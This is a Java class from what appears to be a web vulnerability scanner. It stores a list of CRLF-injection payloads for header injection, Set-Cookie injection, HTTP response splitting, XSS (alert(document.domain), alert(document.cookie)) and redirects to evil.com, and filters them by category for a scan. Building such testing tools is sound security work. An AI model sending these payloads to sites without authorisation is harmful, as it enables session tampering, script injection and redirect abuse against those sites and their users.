
import java.util.ArrayList;

import java.util.List;
import java.util.Random;

public class PayloadManager {

    private static final List<String> RAW_PAYLOADS = new ArrayList<>();

    static {
        // Populated from the user's EXACT list
        RAW_PAYLOADS.add("/%%0a0aSet-Cookie:splitter=1");
        RAW_PAYLOADS.add("/%0aSet-Cookie:splitter=1;");
        RAW_PAYLOADS.add("/%0aSet-Cookie:splitter=1");
        RAW_PAYLOADS.add("/%0d%0aLocation: http://evil.com");
        RAW_PAYLOADS.add("/%0d%0aContent-Length:35%0d%0aX-XSS-Protection:0%0d%0a%0d%0a23");
        RAW_PAYLOADS.add("/%0d%0a%0d%0a<script>alert('XSS')</script>;");
        RAW_PAYLOADS.add(
                "/%0d%0aContent-Length:35%0d%0aX-XSS-Protection:0%0d%0a%0d%0a23%0d%0a<svg onload=alert(document.domain)>%0d%0a0%0d%0a/%2e%2e");
        RAW_PAYLOADS.add(
                "/%0d%0aContent-Type: text/html%0d%0aHTTP/1.1 200 OK%0d%0aContent-Type: text/html%0d%0a%0d%0a<script>alert('XSS');</script>");
        RAW_PAYLOADS.add(
                "/%0d%0aHost: {{Hostname}}%0d%0aCookie: splitter=1%0d%0a%0d%0aHTTP/1.1 200 OK%0d%0aSet-Cookie: splitter=1%0d%0a%0d%0a");
        RAW_PAYLOADS.add("/%0d%0aLocation: www.evil.com");
        RAW_PAYLOADS.add("/%0d%0aSet-Cookie:splitter=1;");
        RAW_PAYLOADS.add("/%0aSet-Cookie:splitter=1");
        RAW_PAYLOADS.add(
                "/%23%0aLocation:%0d%0aContent-Type:text/html%0d%0aX-XSS-Protection:0%0d%0a%0d%0a<svg/onload=alert(document.domain)>");
        RAW_PAYLOADS.add("/%23%0aSet-Cookie:splitter=1");
        RAW_PAYLOADS.add("/%25%30%61Set-Cookie:splitter=1");
        RAW_PAYLOADS.add("/%2e%2e%2f%0d%0aSet-Cookie:splitter=1");
        RAW_PAYLOADS.add(
                "/%2Fxxx:1%2F%0aX-XSS-Protection:0%0aContent-Type:text/html%0aContent-Length:39%0a%0a<script>alert(document.cookie)</script>%2F../%2F..%2F..%2F..%2F../tr");
        RAW_PAYLOADS.add(
                "/%3f%0d%0aLocation:%0d%0asplitter-x:splitter-x%0d%0aContent-Type:text/html%0d%0aX-XSS-Protection:0%0d%0a%0d%0a<script>alert(document.domain)</script>");
        RAW_PAYLOADS.add("/%5Cr%20Set-Cookie:splitter=1;");
        RAW_PAYLOADS.add("/%5Cr%5Cn%20Set-Cookie:splitter=1;");
        RAW_PAYLOADS.add("/%5Cr%5Cn%5CtSet-Cookie:splitter%5Cr%5CtSet-Cookie:splitter=1;");
        RAW_PAYLOADS.add("/%E5%98%8A%E5%98%8D%0D%0ASet-Cookie:splitter=1;");
        RAW_PAYLOADS.add("/%E5%98%8A%E5%98%8DLocation:www.evil.com");
        RAW_PAYLOADS.add("/%E5%98%8D%E5%98%8ALocation:www.evil.com");
        RAW_PAYLOADS.add("/%E5%98%8D%E5%98%8ASet-Cookie:splitter=1");
        RAW_PAYLOADS.add("/%E5%98%8D%E5%98%8ASet-Cookie:splitter=1;");
        RAW_PAYLOADS.add("/%E5%98%8D%E5%98%8ASet-Cookie:splitterxp=splitterxp");
        RAW_PAYLOADS.add("/%u000ASet-Cookie:splitter=1;");
        RAW_PAYLOADS.add("/www.evil.com/%2E%2E%2F%0D%0Asplitter-x:splitter-x");
        RAW_PAYLOADS.add("/www.evil.com/%2F..%0D%0Asplitter-x:splitter-x");
    }

    /**
     * Generates a random alphanumeric token of length 6-8.
     */
    public String generateToken() {
        int length = 6 + new Random().nextInt(3); // 6, 7, or 8
        String chars = "abcdefghijklmnopqrstuvwxyz0123456789";
        StringBuilder token = new StringBuilder();
        Random random = new Random();
        for (int i = 0; i < length; i++) {
            token.append(chars.charAt(random.nextInt(chars.length())));
        }
        return token.toString();
    }

    public enum PayloadCategory {
        ALL,
        HEADER_INJECTION,
        XSS,
        OPEN_REDIRECT,
        RESPONSE_SPLITTING
    }

    /**
     * Returns the list of payloads with dynamic replacements, filtered by category.
     * 
     * @param baseUrl  The base URL of the target.
     * @param hostname The hostname of the target.
     * @param token    The random token generated for this scan.
     * @param category The category of payloads to return.
     * @return List of processed payloads.
     */
    public List<String> getPayloads(String baseUrl, String hostname, String token, PayloadCategory category) {
        List<String> processedPayloads = new ArrayList<>();
        String tokenReplacement = "splitter_" + token + "=crlf";

        for (String payload : RAW_PAYLOADS) {
            // Filter based on category
            if (!isPayloadInCategory(payload, category)) {
                continue;
            }

            String temp = payload;

            // Replace standard placeholders
            if (hostname != null) {
                temp = temp.replace("{{Hostname}}", hostname);
            }
            if (baseUrl != null) {
                temp = temp.replace("{{BaseURL}}", baseUrl);
            }

            // Replace static markers with dynamic token
            temp = temp.replace("splitter=1", tokenReplacement);

            processedPayloads.add(temp);
        }
        return processedPayloads;
    }

    private boolean isPayloadInCategory(String payload, PayloadCategory category) {
        if (category == PayloadCategory.ALL) {
            return true;
        }

        String lower = payload.toLowerCase();
        boolean isOpenRedirect = lower.contains("location:") && lower.contains("evil.com");
        boolean isXss = lower.contains("<script") || lower.contains("<svg");
        boolean isResponseSplitting = lower.contains("http/1.1");

        // Header Injection is everything else (Set-Cookie, Custom Headers)
        // basically if it's NOT one of the specific ones above, it's generic header
        // injection.
        // OR if the user specifically asked for Header Injection, we might want to
        // INCLUDE
        // those that are technically header injection but have other effects?
        // The prompt says: "Test for Arbitrary Header Injection: Only payloads that
        // attempt Set-Cookie injection / Custom header injection"
        // Most open redirect payloads start with "Location:", so they are header
        // injections too.
        // But usually "Arbitrary Header Injection" implies inserting a NEW header
        // key/value that isn't Location or causing XSS/Splitting.
        // Let's define Header Injection as strictly NOT (Open Redirect OR XSS OR
        // Splitting).

        switch (category) {
            case OPEN_REDIRECT:
                return isOpenRedirect;
            case XSS:
                return isXss;
            case RESPONSE_SPLITTING:
                return isResponseSplitting;
            case HEADER_INJECTION:
                return !isOpenRedirect && !isXss && !isResponseSplitting;
            default:
                return true;
        }
    }
}
